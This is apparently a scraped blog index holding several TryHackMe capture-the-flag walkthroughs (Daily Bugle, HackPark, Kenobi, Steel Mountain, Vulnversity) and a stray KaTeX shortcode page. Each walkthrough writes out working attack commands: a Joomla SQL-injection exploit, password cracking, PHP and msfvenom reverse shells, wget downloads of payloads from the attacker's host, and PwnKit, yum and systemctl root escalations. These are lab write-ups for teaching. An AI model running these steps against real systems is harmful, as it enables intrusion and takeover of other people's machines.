AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B | 256 5cd682dab219e33799fb96820870ee9d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src= | 256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40) | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ 3306/tcp open mysql syn-ack ttl 61 MariaDB (unauthorized) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 92.57 seconds Raw packets sent: 7 (284B) | Rcvd: 4 (160B) Enumeration # We can see three open ports 22, 80 and 3306. There\u0026rsquo;s a website hosted on port 80, mysql service on port 3306 and SSH on port 22.\nLet\u0026rsquo;s navigate to the website that\u0026rsquo;s hosted on port 80. There\u0026rsquo;s Daily Bugle and it says that Spider-Man robs bank.\nFrom the scan results, we found that there are some disallowed entries in robots.txt. Let\u0026rsquo;s navigate to robots.txt and see if we can find any useful paths.\n# If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # http://www.robotstxt.org/orig.html # # For syntax checking, see: # http://tool.motoricerca.info/robots-checker.phtml User-agent: * Disallow: /administrator/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/ The /administrator/ leads to a Joomla login page. Let\u0026rsquo;s try to find the version of Joomla.\nA simple google search gave the path /administrator/manifests/files/joomla.xml where the Joomla version can be found.\nhttps://www.zyxware.com/articles/5532/how-to-know-the-version-of-joomla-site-without-admin-access\nThis XML file does not appear to have any style information associated with it. The document tree is shown below. \u0026lt;extension version=\u0026#34;3.6\u0026#34; type=\u0026#34;file\u0026#34; method=\u0026#34;upgrade\u0026#34;\u0026gt; \u0026lt;name\u0026gt;files_joomla\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Joomla! Project\u0026lt;/author\u0026gt; \u0026lt;authorEmail\u0026gt;admin@joomla.org\u0026lt;/authorEmail\u0026gt; \u0026lt;authorUrl\u0026gt;www.joomla.org\u0026lt;/authorUrl\u0026gt; \u0026lt;copyright\u0026gt; (C) 2005 - 2017 Open Source Matters. All rights reserved \u0026lt;/copyright\u0026gt; \u0026lt;license\u0026gt; GNU General Public License version 2 or later; see LICENSE.txt \u0026lt;/license\u0026gt; \u0026lt;version\u0026gt;3.7.0\u0026lt;/version\u0026gt; \u0026lt;creationDate\u0026gt;April 2017\u0026lt;/creationDate\u0026gt; \u0026lt;description\u0026gt;FILES_JOOMLA_XML_DESCRIPTION\u0026lt;/description\u0026gt; \u0026lt;scriptfile\u0026gt;administrator/components/com_admin/script.php\u0026lt;/scriptfile\u0026gt; \u0026lt;update\u0026gt; \u0026lt;schemas\u0026gt; \u0026lt;schemapath type=\u0026#34;mysql\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/mysql \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;sqlsrv\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/sqlazure \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;sqlazure\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/sqlazure \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;postgresql\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/postgresql \u0026lt;/schemapath\u0026gt; \u0026lt;/schemas\u0026gt; \u0026lt;/update\u0026gt; \u0026lt;fileset\u0026gt; \u0026lt;files\u0026gt; \u0026lt;folder\u0026gt;administrator\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;bin\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;cache\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;cli\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;components\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;images\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;includes\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;language\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;layouts\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;libraries\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;media\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;modules\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;plugins\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;templates\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;tmp\u0026lt;/folder\u0026gt; \u0026lt;file\u0026gt;htaccess.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;web.config.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;LICENSE.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;README.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;index.php\u0026lt;/file\u0026gt; \u0026lt;/files\u0026gt; \u0026lt;/fileset\u0026gt; \u0026lt;updateservers\u0026gt; \u0026lt;server name=\u0026#34;Joomla! Core\u0026#34; type=\u0026#34;collection\u0026#34;\u0026gt;https://update.joomla.org/core/list.xml\u0026lt;/server\u0026gt; \u0026lt;/updateservers\u0026gt; \u0026lt;/extension\u0026gt; Upon checking the vulnerabilities for the Joomla 3.7, there is an SQL Injection vulnerability present in Joomla 3.7.x before 3.7.1.\nhttps://www.cvedetails.com/cve/CVE-2017-8917/\nExploitation # There is a python code available to exploit this vulnerability.\nhttps://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py\n┌──(root㉿kali)-[~/tryhackme] └─# ./joomblah.py http://10.10.59.64/ .---. .-\u0026#39;\u0026#39;\u0026#39;-. .-\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39; _ \\ \u0026#39; _ \\ .---. \u0026#39;---\u0026#39; / /` \u0026#39;. \\ / /` \u0026#39;. \\ __ __ ___ /| | | . .---.. | \\ \u0026#39; . | \\ \u0026#39; | |/ `.\u0026#39; `. || | | .\u0026#39;| | || \u0026#39; | \u0026#39;| \u0026#39; | \u0026#39;| .-. .-. \u0026#39;|| | | \u0026lt; | | |\\ \\ / / \\ \\ / / | | | | | ||| __ | | __ | | | | `. ` ..\u0026#39; / `. ` ..\u0026#39; / | | | | | |||/\u0026#39;__ \u0026#39;. | | .:--.\u0026#39;. | | .\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39;-...-\u0026#39;` \u0026#39;-...-\u0026#39;` | | | | | ||:/` \u0026#39;. \u0026#39;| |/ | \\ | | |/.\u0026#39;\u0026#39;\u0026#39;. \\ | | | | | | | ||| | || |`\u0026#34; __ | | | / | | | | |__| |__| |__|||\\ / \u0026#39;| | .\u0026#39;.\u0026#39;\u0026#39;| | | | | | __.\u0026#39; \u0026#39; |/\u0026#39;..\u0026#39; / \u0026#39;---\u0026#39;/ / | |_| | | | | \u0026#39; \u0026#39; `\u0026#39;-\u0026#39;` \\ \\._,\\ \u0026#39;/| \u0026#39;. | \u0026#39;. |____.\u0026#39; `--\u0026#39; `\u0026#34; \u0026#39;---\u0026#39; \u0026#39;---\u0026#39; [-] Fetching CSRF token [-] Testing SQLi - Found table: fb9j5_users - Extracting users from fb9j5_users [$] Found user [\u0026#39;811\u0026#39;, \u0026#39;Super User\u0026#39;, \u0026#39;jonah\u0026#39;, \u0026#39;jonah@tryhackme.com\u0026#39;, \u0026#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;] - Extracting sessions from fb9j5_session We found a user jonah with a password hash. Let\u0026rsquo;s crack the hash using John The Ripper. It takes quite some time to crack the password.\n┌──(root㉿kali)-[~/tryhackme] └─# cat hash.txt $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm ┌──(root㉿kali)-[~/tryhackme] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X2]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status spiderman123 (?) 1g 0:00:08:37 DONE (2023-03-20 01:18) 0.001933g/s 90.54p/s 90.54c/s 90.54C/s sweetsmile..speciala Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Let\u0026rsquo;s login to Joomla using the credentials jonah and spiderman123.\nUpon navigating to the templates section and clicking on templates, we can see the templates that are being used. In each template, we can see some php files. Let\u0026rsquo;s try to get a php reverse shell using those. Navigate to index.php file in protostar template and replace the code with the following php code.\nhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nMake sure to change the ip address in the php file.\nStart the netcat listener and navigate to main website that\u0026rsquo;s being hosted on port 80.\n┌──(root㉿kali)-[~/tools] └─# nc -lnvp 1234 listening on [any] 1234 ... connect to [10.6.10.164] from (UNKNOWN) [10.10.59.64] 48864 Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 01:46:50 up 34 min, 0 users, load average: 0.00, 0.01, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=48(apache) gid=48(apache) groups=48(apache) sh: no job control in this shell sh-4.2$ We get a foothold on the machine.\nPrivilege Escalation # Method 1 # Use the PwnKit exploit to get root privileges.\nhttps://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit\nDownload the binary to host machine and serve it using python http web server. Then download the binary to the target machine\u0026rsquo;s /tmp directory, change the permissions to executable and run it.\npython -m http.server sh-4.2$ wget http://10.6.10.164:8000/PwnKit wget http://10.6.10.164:8000/PwnKit --2023-03-20 02:01:32-- http://10.6.10.164:8000/PwnKit Connecting to 10.6.10.164:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 18040 (18K) [application/octet-stream] Saving to: \u0026#39;PwnKit\u0026#39; 100%[======================================\u0026gt;] 18,040 --.-K/s in 0.09s 2023-03-20 02:01:32 (189 KB/s) - \u0026#39;PwnKit\u0026#39; saved [18040/18040] sh-4.2$ chmod +x PwnKit chmod +x PwnKit sh-4.2$ ./PwnKit ./PwnKit [root@dailybugle tmp]# id id uid=0(root) gid=0(root) groups=0(root),48(apache) [root@dailybugle tmp]# Method 2 # Download linpeas.sh to the target machine and run it.\nsh-4.2$ cd /tmp cd /tmp sh-4.2$ wget http://10.6.10.164:8000/linpeas.sh wget http://10.6.10.164:8000/linpeas.sh --2023-03-20 02:18:45-- http://10.6.10.164:8000/linpeas.sh Connecting to 10.6.10.164:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 828172 (809K) [text/x-sh] Saving to: \u0026#39;linpeas.sh\u0026#39; 0K .......... .......... .......... .......... .......... 6% 260K 3s 50K .......... .......... .......... .......... .......... 12% 554K 2s 100K .......... .......... .......... .......... .......... 18% 2.42M 1s 150K .......... .......... .......... .......... .......... 24% 665K 1s 200K .......... .......... .......... .......... .......... 30% 1.76M 1s 250K .......... .......... .......... .......... .......... 37% 7.66M 1s 300K .......... .......... .......... .......... .......... 43% 7.49M 1s 350K .......... .......... .......... .......... .......... 49% 971K 0s 400K .......... .......... .......... .......... .......... 55% 3.86M 0s 450K .......... .......... .......... .......... .......... 61% 2.12M 0s 500K .......... .......... .......... .......... .......... 68% 9.80M 0s 550K .......... .......... .......... .......... .......... 74% 13.5M 0s 600K .......... .......... .......... .......... .......... 80% 3.34M 0s 650K .......... .......... .......... .......... .......... 86% 1.07M 0s 700K .......... .......... .......... .......... .......... 92% 8.62M 0s 750K .......... .......... .......... .......... .......... 98% 2.25M 0s 800K ........ 100% 65.8M=0.6s 2023-03-20 02:18:45 (1.31 MB/s) - \u0026#39;linpeas.sh\u0026#39; saved [828172/828172] sh-4.2$ chmod +x linpeas.sh chmod +x linpeas.sh sh-4.2$ ./linpeas.sh We found a public password in php config files.\n╔══════════╣ Searching passwords in config PHP files public $password = \u0026#39;nv5uz9r3ZEDzVjNu\u0026#39;; $this-\u0026gt;password = (empty($this-\u0026gt;options[\u0026#39;db_pass\u0026#39;])) ? \u0026#39;\u0026#39; : $this-\u0026gt;options[\u0026#39;db_pass\u0026#39;]; $this-\u0026gt;password = null; \u0026#39;password\u0026#39; =\u0026gt; $this-\u0026gt;password, Let\u0026rsquo;s try this password to switch the user from apache to jjameson.\nsh-4.2$ su jjameson su jjameson Password: nv5uz9r3ZEDzVjNu id uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson) whoami jjameson It worked. We successfully changed to the user jjameson.\nNow, let\u0026rsquo;s see what binaries can be run using sudo.\nsudo -l Matching Defaults entries for jjameson on dailybugle: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User jjameson may run the following commands on dailybugle: (ALL) NOPASSWD: /usr/bin/yum The user jjameson can run the binary yum with root privileges.\nNavigate to GTFO bins.\nhttps://gtfobins.github.io/gtfobins/yum/#sudo\nWe can spawn an interactive root shell by loading a custom plugin as follows.\nid uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson) whoami jjameson TF=$(mktemp -d) cat \u0026gt;$TF/x\u0026lt;\u0026lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat \u0026gt;$TF/y.conf\u0026lt;\u0026lt;EOF [main] enabled=1 EOF cat \u0026gt;$TF/y.py\u0026lt;\u0026lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=\u0026#39;2.1\u0026#39; def init_hook(conduit): os.execl(\u0026#39;/bin/sh\u0026#39;,\u0026#39;/bin/sh\u0026#39;) EOF sudo yum -c $TF/x --enableplugin=y Loaded plugins: y No plugin match for: y id uid=0(root) gid=0(root) groups=0(root) whoami root We got the root shell!\n"},{"id":20,"href":"/posts/2023-05-12-06-HackPark/","title":"HackPark","section":"Blog","content":"Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!\nScanning # Let\u0026rsquo;s begin by scanning the target using RustScan.\nrustscan -a 10.10.120.14 -r 1-65535 --ulimit 5000 -- -sVC Enumeration # We can see two open ports. Let\u0026rsquo;s see what\u0026rsquo;s running on port 80.\nIf we click on the menu icon, we can see the login page.\nWe can see that the login page belongs to blogengine.\nNow, we will try to use the default credentials admin:admin to see if that works. But it failed. Now, let\u0026rsquo;s bruteforce the password with the username admin as we know that the default username is admin.\nFirst, we will fire up Burp Suite to see what type of request the login page is making to the web server. Let\u0026rsquo;s enter admin:admin in the username and password fields and intercept this using Burp Suite.\nWe can see that the login page is making a POST request. We will now use Hydra to brute force the password field assuming the username is admin.\nhydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.120.14 http-post-form \u0026#34;/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=Pw49CE7XN99O07VsfmUKlS3GQsevl39oxTcHs0fj672xrsEdiwp26MjPpiJLmnJc%2Badroz9oDltpxOKHPbB6cf7nhiuXQBiHwnZYUwx%2BFAGXtU1YQQcxOXrvAntLHand12BsvenypZEkD5DkrYrd6pOBUBnwCzdk6T3Aco66LLlCpW4A\u0026amp;__EVENTVALIDATION=B93mjHyaWPm5JljuEQuMNVayeIlWC4kRbNsrSF9DjvDYBb6ZBhz%2Byag9pTRt8hhBdxWgdwlqd9DiLXamGJERhiMUxR814calYKBvOWaCNKv3zyDSzKVhONt5%2BvmcuOkDTIDPGB6Bpq0Dktu4om3tg%2BjlkZrV4I5NyuuANXrlQgJH71q8\u0026amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^\u0026amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^\u0026amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\u0026#34; -v It shows that we successfully found the password for the username admin. Now, let\u0026rsquo;s login using the username admin and the password we found.\nWe can see a dashboard and when we click on about, we can see the version of the blogengine.\nNow, we will use searchsploit to find any available exploits.\nWe can see an exploit for the version 3.3.6. Now, copy that exploit to the current path.\nWe can see the description of the exploit and how to use it.\nExploitation # This is a path traversal vulnerability leading to remote code execution which is caused by an unchecked theme parameter that is used to override the default theme for rendering blog pages.\nChange the ip address and port number in the exploit and save it as PostView.ascx.\nNow, navigate to the path that was mentioned in the website.\nhttp://10.10.120.14/admin/app/editor/editpost.cshtml Click on the file manager icon and then upload the PostView.ascx file.\nLet\u0026rsquo;s start the netcat listener on port 2222.\nnc -lnvp 2222 Now we will navigate to the path as show below to trigger the vulnerability.\nhttp://10.10.120.14/?theme=../../App_Data/files We received a shell in the netcat listener!\nWe will elevate out netcat shell to meterpreter shell. We will start this by generating a payload using msfvenom.\nStart metasploit and use exploit multi/handler.\nuse multi/handler set lhost tun0 set lport 3333 exploit Start the python http server using the following command. It serves on port 8000 by default.\npython -m http.server Now, download the payload to the target machine and run it.\npowershell -c wget http://10.6.10.164:8000/shell.exe -outfile shell.exe We now got a reverse shell via metasploit!\nPrivilege Escalation # Method 1: Using meterpreter\u0026rsquo;s getsystem # Use the command getsystem to elevate the privileges from local user to root user.\nMethod 2: Using Windows Scheduled Task # We already have the meterpreter reverse shell. Let\u0026rsquo;s see what all processes are running.\nWe can see that there are a lot of process running. Out of them WScheduler.exe is an interesting process because we can try to elevate our privileges by using the scheduled service. If we navigate to the path of SystemScheduler, there are a lot of processes. And when we navigate to events, we can see the log file 20198415519.INI_LOG.txt.\nWhen we see the contents inside the log file, there is a specific process Message.exe running as administrator. So, let\u0026rsquo;s try to replace this Message.exe with our malicious exe file with the same name.\nWe will generate a payload using msfvenom.\nmsfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.10.164 LPORT=5555 -f exe -o Message.exe Now we will background the current meterpreter session.\nbg Now set the port to 5555 and run the exploit in background.\nset lport 5555 exploit -j Now, get back to the first meterpreter session.\nsessions -l sessions -i 1 Navigate to the path C:\\Program Files (x86)\\SystemScheduler. Now, move the Message.exe file to some other location.\nmv Message.exe C:\\Windows Now upload the malicious file that we just created using msfvenom.\nupload Message.exe Keep the current meterpreter session to backround and check the sessions.\nbg sessions -l We can find a new session opened as the user Administrator.\nWe now got a reverse shell as root!\n"},{"id":21,"href":"/docs/shortcodes/katex/","title":"KaTeX","section":"Shortcodes","content":" KaTeX # KaTeX shortcode let you render math typesetting in markdown document. See KaTeX\nExample # {{\u0026lt; katex display=true class=\u0026#34;optional\u0026#34; \u0026gt;}} f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi {{\u0026lt; /katex \u0026gt;}} \\[f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi\\] Display Mode Example # Here is some inline example: \\(\\pi(x)\\) , rendered in the same line. And below is display example, having display: block \\[f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi\\] Text continues here.\n"},{"id":22,"href":"/posts/Kenobi/","title":"Kenobi","section":"Blog","content":"Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.\nScanning # First we will deploy the machine and scan the target using rustscan.\nEnumeration # We can see that there is Samba file server running, so let\u0026rsquo;s find the available shares.\nsmbclient -L 10.10.74.95 We will now connect to the anonymous share.\nsmbclient \\\\\\\\10.10.74.95\\\\anonymous When we read the log.txt file, we can see the user is kenobi, the id_rsa file path and the ftp running on port 21.\nOn the port 111 we see there is rpcbind service running and in the rpcinfo we can see that nfs service is running. So, let\u0026rsquo;s enumerate for nfs shares and from the mount information we can see the mount /var.\nnmap -p 111 -script=nfs-ls,nfs-statfs,nfs-showmount10.10.74.95 We saw there is a ftp service running on port 21. Let\u0026rsquo;s try to grab the banner of ftp to find the ftp version using netcat.\nnc 10.10.74.95 21 We will use searchsploit to find for any vulnerabilities present in the 1.3.5 version of ProFTPd.\nsearchsploit proftpd 1.3.5 While looking for the vulnerabilities for the proftpd version 1.3.5, we found that there is a vulnerability that exploits SITE CPFR/CPTO commands.\nExploitation # Using this we can copy files in the target. So, we will copy the id_rsa file to the /var directory and then mount the /var directory to our machine.\nLet\u0026rsquo;s connect to ftp and copy the files.\nnc 10.10.74.95 21 SITE CPFR /home/kenobi/.ssh/id_rsa SITE CPTO /var/tmp/id_rsa Now we will mount the /var directory to our machine.\nmkdir /mnt/kenobi mount 10.10.74.95:/var /mnt/kenobi cd /mnt/kenobi We can see the file, we will copy it to our machine and change the permissions for the file. Now ssh into the target as user kenobi.\nchmod 600 id_rsa ssh kenobi@10.10.74.95 -i id rsa We\u0026rsquo;re logged in as kenobi and we can read the user flag.\nPrivilege Escalation # Approach 1 # We will find the files with SUID bit set.\nfind / -perm -u=s - type f 2\u0026gt;/dev/null /usr/bin/menu seems to be unusual among the list of file that we got.\nWhen we execute that binary, we can see a couple of commands that can be executed. We will now manipulate the PATH variable to get our root shell.\nWhen we used the first command to test what that does, we can see it is using curl to run the status check. Now, we will replace the functionality of the curl command in the status check with the /bin/sh and add it to the path so that we can get the shell as soon it gets executed.\nWe got the root shell!!!\nApproach 2 # Start the python http server and download linpeas.sh to the target machine.\npython -m http.server 1111 On target machine\nwet http: //10.6.29.149:1111/linpeas.sh Change the file permissions to executable and run the file.\nchmod +x linpeas.sh ./linpeas.sh We can see that the target machine is vulnerable to CVE-2021-4034.\nClone the repo into your machine.\nhttps://github.com/ryaagard/CVE-2021-4034.git cd CVE-2021-4034 Start the python server again to server the files.\npython -m http.server 1111 On target machine create a folder and download all the files to the machine.\nwet http://10.6.29.149:1111/evil.so wget http://10.6.29.149:1111/evil-so.c wget http://10.6.29.149:1111/exploit.c wget http://10.6.29.149:1111/Makefile wget http://10.6.29.149:1111/README.md Run the make file.\nmake Execute exploit.sh.\n./exploit.sh We got the root shell!!!\n"},{"id":23,"href":"/posts/2023-05-12-04-Steel-Mountain/","title":"Steel-Mountain","section":"Blog","content":"Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.\nScanning # Let\u0026rsquo;s begin by scanning the target. We will first scan the target using Rustscan.\nEnumeration # There are a lot of ports open and since port 80 is open we will check what\u0026rsquo;s running on that port.\nThere is an image displaying their employee of the month and we can see the name Steel Mountain which might be an organization.\nWhile opening the image in a new tab we can see the name of the image as Bill Harper.\nNow, we will check what\u0026rsquo;s running on port 8080. We can see that there is some file server running. Under the server information, there is mentioned that it is HttpFileServer 2.3.\nOn clicking that leads us to this page which shows that it is a Rejetto HttpFileServer 2.3.\nExploitation # We will search in metasploit if we can find any exploits.\nWe found a module which is successfully tested on the version 2.3b. So, we will use this.\nWe will set all the required options.\nset rhost 10.10.2.217 set rport 8080 set lhost tun0 Run the exploit.\nexploit We got the meterpreter reverse shell and we can read the user flag.\nPrivilege Escalation # Now, we will elevate our privileges. We will download the powershell script which can find common Windows privilege escalation vectors that rely on misconfigurations in the target. We will first download the script to our machine.\nLet\u0026rsquo;s upload it to the target.\nupload powerup.ps1 Load the powershell module and use powershell.\nload powershell powershell_shell Run the script PowerUp.ps1 that we just downloaded into the target and run it.\n. .\\powerup.ps1 We will now run all the checks in this module using the following command.\nInvoke-AllChecks When we run the command, we can see that there is a unquoted service path vulnerability as we can see it in the checks. More information on unquoted service path vulnerability can be found here.\nFor the service AdvancedSystemCareService9, the CanRestart option is set to true which means that the service can be restarted. We will now create a malicious file and upload it in the IObit folder and then restart the service to get the reverse shell. The file name is set to Advanced because we are uploading the file into the path where the Advanced SystemCare folder is present as we know there is an unquoted service path vulnerability. Since the service AdvancedSystemCareService9 is running as system32, we will be getting a reverse shell as system32.\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.2.217 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe Exit the powershell. Using the earlier meterpreter reverse shell, change directory to the path IObit and then upload the malicious file that we created.\nupload Advanced.exe Open another terminal and use netcat listener on port 4443 to get the reverse shell.\nnc -lnvp 4443 Now, load the command prompt shell using the command in the meterpreter shell.\nshell Restart the AdvancedSystemCareService9 service by using the following commands.\nsc stop AdvancedSystemCareService9 sc start AdvancedSystemCareService9 Now we get a reverse shell in the other terminal window running as system32!\n"},{"id":24,"href":"/posts/Vulnversity/","title":"Vulnversity","section":"Blog","content":"Learn about active recon, web app attacks and privilege escalation.\nTask 1 # Deploy the machine.\nTask 2 # Scan the machine for open ports using nmap.\nnmap -sVC -oN vulnversity.txt 10.10.79.6 There was an apache server running on port 3333.\nTask 3 # Let\u0026rsquo;s fuzz for directories using gobuster.\ngobuster dir -u http://10.10.79.6:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt There was a directory /internal/.\nTask 4 # Upon viewing it, there was a file upload functionality. Using this we can upload a malicious php file to get a reverse shell. Copy the php file from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php and edit the ip address to tun0 ip address.\nLet us try to upload a php file and see if it\u0026rsquo;s accepting the file type. The file type php is not accepted.\nStart Burp Suite and configure the proxy in the browser.\nUpload the php file that we just created and capture the request in Burp.\nSend the request to intruder and in payload positions, select attack type as sniper and add \u0026lsquo;§\u0026rsquo; to the file extension php.\nGo to payload options, add the extensions php, php3, php4. php5, phtml and start the attack.\nAfter the attack was completed, we can see the results. In that sort by length and the length for phtml is 723 and for the rest of them 737. Also, for confirming that it was the correct file type allowed, check the response.\nNow, edit the file extension of the php file we created to phtml.\nUpload the file, and in another terminal start a netcat listener.\nnc -lnvp 1234 The file is uploaded, but we don\u0026rsquo;t know where it is uploaded. Let\u0026rsquo;s use gobuster again to fuzz for directories inside /internal.\ngobuster dir -u http://10.10.79.6:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt There was an uploads directory. In the browser, access the file we uploaded which will be present in the path.\nhttp://10.10.79.6:3333/internal/uploads/php_reverse_shell.phtml.\nAfter file is accessed, we get a reverse shell.\nNow that we\u0026rsquo;ve got a shell, we need to stabilize the shell as it is unstable. We don\u0026rsquo;t want to loose our connection if we hit ctrl+c or anything.\nRun the command to spawn a tty shell.\npython -c \u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; Now hit ctrl+z to background it.\nCtrl+Z Now you will get your shell and disable text display and foreground the process.\nstty raw -echo \u0026amp;\u0026amp; fg Set the terminal variable.\nexport TERM=xterm Task 5 # Now run to find SUID files with root permission.\nfind / -user root -perm -4000 -exec ls -ldb {} \\; We found some interesting files. Of them, /bin/systemctl is running as root.\nHead to https://gtfobins.github.io/gtfobins/systemctl/#suid.\nWe will try to follow that to check whether it will work or not.\nTF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;id \u0026gt; /tmp/output\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF ./systemctl link $TF ./systemctl enable --now $TF Now we see output of the command id in the file 